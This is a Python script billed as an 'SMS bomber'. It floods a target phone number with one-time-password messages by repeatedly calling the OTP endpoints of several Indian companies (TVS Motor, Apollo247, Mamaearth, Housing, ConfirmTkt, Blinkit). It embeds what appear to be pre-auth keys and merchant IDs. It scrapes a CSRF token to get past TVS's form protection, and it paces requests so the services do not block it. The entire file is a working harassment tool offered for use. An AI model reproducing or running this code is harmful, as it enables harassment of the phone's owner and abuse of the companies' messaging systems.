import requests
import os
import time
import threading
import json
from bs4 import BeautifulSoup

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0
lock = threading.Lock() # Counters को सुरक्षित रखने के लिए

# ---------------------------------------------------------
# API DATABASE
# ---------------------------------------------------------
SMS_APIS = [
    {
        "name": "TVS Motor",
        "method": "SPECIAL_TVS", # Special handling logic
        "url": "https://www.tvsmotor.com/api/Ecommerce/GetAccountOtp",
        "login_url": "https://www.tvsmotor.com/account/login"
    },
    {
        "name": "Apollo247",
        "method": "POST",
        "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
        "json": {"loginType": "PATIENT", "mobileNumber": "+91{target}"},
        "headers": {
            "X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9.ZTVhM2I0YmEtY2E0NC00M2I0LTg0ZTUtZDU3M2M1YjRjZTU3.XyJ9",
            "platform": "web",
            "Origin": "https://www.apollo247.com"
        }
    },
    {
        "name": "Mamaearth",
        "method": "POST",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "json": {"phone": "{target}", "country": "in", "country_code": "+91"},
        "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}
    },
    {
        "name": "Housing", 
        "method": "POST", 
        "url": "https://login.housing.com/api/v2/send-otp", 
        "json": {"phone": "{target}"}
    },
    {
        "name": "ConfirmTkt", 
        "method": "GET", 
        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
        "params": {"newOtp": "true", "mobileNumber": "{target}"}
    },
    {
        "name": "Blinkit",
        "method": "POST",
        "url": "https://blinkit.com/v1/user/otp/send",
        "json": {"phone": "{target}"},
        "headers": {"app_client": "consumer_web"}
    }
]

# ---------------------------------------------------------
# SPECIAL FUNCTIONS
# ---------------------------------------------------------

def get_tvs_token(login_url, headers):
    """TVS की वेबसाइट से Dynamic Token और Cookies निकालता है"""
    session = requests.Session()
    try:
        # 1. Login पेज लोड करें
        res = session.get(login_url, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        # 2. Hidden input से टोकन ढूंढें
        token = soup.find('input', {'name': '__RequestVerificationToken'})['value']
        return token, session.cookies
    except:
        return None, None

# ---------------------------------------------------------
# CORE SENDING LOGIC
# ---------------------------------------------------------

def send_otp(api, target):
    global success_count, failed_count
    
    # Realistic Headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    }
    
    # API specific headers जोड़ें
    if "headers" in api:
        headers.update(api["headers"])
    
    try:
        res = None
        
        # 1. TVS Special Logic
        if api.get("method") == "SPECIAL_TVS":
            # Form-data headers ज़रूरी हैं
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
            headers["X-Requested-With"] = "XMLHttpRequest"
            
            token, cookies = get_tvs_token(api["login_url"], headers)
            if token:
                payload = {
                    "MobileNumber": target,
                    "Locale": "V",
                    "__RequestVerificationToken": token
                }
                res = requests.post(api["url"], data=payload, cookies=cookies, headers=headers, timeout=10)
            else:
                raise Exception("TVS Token Fetch Failed")

        # 2. Standard GET Logic
        elif api["method"] == "GET":
            url = api["url"].replace("{target}", target)
            params_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()}
            res = requests.get(url, params=params_p, headers=headers, timeout=10)

        # 3. Standard POST Logic (Mamaearth, Housing, Apollo, etc.)
        else:
            url = api["url"].replace("{target}", target)
            # JSON के अंदर {target} को असली नंबर से बदलें
            json_str = json.dumps(api["json"]).replace("{target}", target)
            json_p = json.loads(json_str)
            res = requests.post(url, json=json_p, headers=headers, timeout=10)

        # Success Verification
        if res and (res.status_code in [200, 201, 202]) and ("fail" not in res.text.lower()):
            with lock:
                success_count += 1
            print(f"{G}[SUCCESS]{W} {api['name']} sent OTP to {target}")
        else:
            with lock:
                failed_count += 1
            print(f"{R}[FAILED]{W} {api['name']} - Status: {res.status_code if res else 'No Response'}")
            
    except Exception as e:
        with lock:
            failed_count += 1
        print(f"{Y}[ERROR]{W} {api['name']} Connection Issue")

# ---------------------------------------------------------
# BOMBING CONTROLLER
# ---------------------------------------------------------

def start_bombing(target, count):
    print(f"\n{Y}[!] Initializing Bombing on {target}...{W}\n")
    threads = []
    
    for i in range(count):
        api = SMS_APIS[i % len(SMS_APIS)] # APIs repeat if count is high
        t = threading.Thread(target=send_otp, args=(api, target))
        t.start()
        threads.append(t)
        
        # Rate limiting taaki block na ho
        if i % 5 == 0:
            time.sleep(1) # Har 5 SMS ke baad 1 sec break
        else:
            time.sleep(0.3)

    for t in threads:
        t.join()

    print(f"\n{G}--- BOMBING FINISHED ---{W}")
    print(f"{G}Total Success: {success_count}{W} | {R}Total Failed: {failed_count}{W}")

# ---------------------------------------------------------
# MAIN INTERFACE
# ---------------------------------------------------------

if __name__ == "__main__":
    # Screen Clear
    os.system('clear || cls')
    
    print(f"""
{Y}╔══════════════════════════════════════════╗
║        ULTIMATE SMS BOMBER v2.0          ║
║    (TVS & Apollo Dynamic Fixed)          ║
╚══════════════════════════════════════════╝{W}""")
    
    target_num = input(f"\n{W}Enter Target Number (10 Digits): {G}")
    if len(target_num) != 10 or not target_num.isdigit():
        print(f"{R}[!] Error: Invalid Mobile Number{W}")
        exit()
        
    try:
        sms_count = int(input(f"{W}Enter Number of SMS: {G}"))
    except ValueError:
        print(f"{R}[!] Error: Enter a valid number{W}")
        exit()
    
    start_bombing(target_num, sms_count)
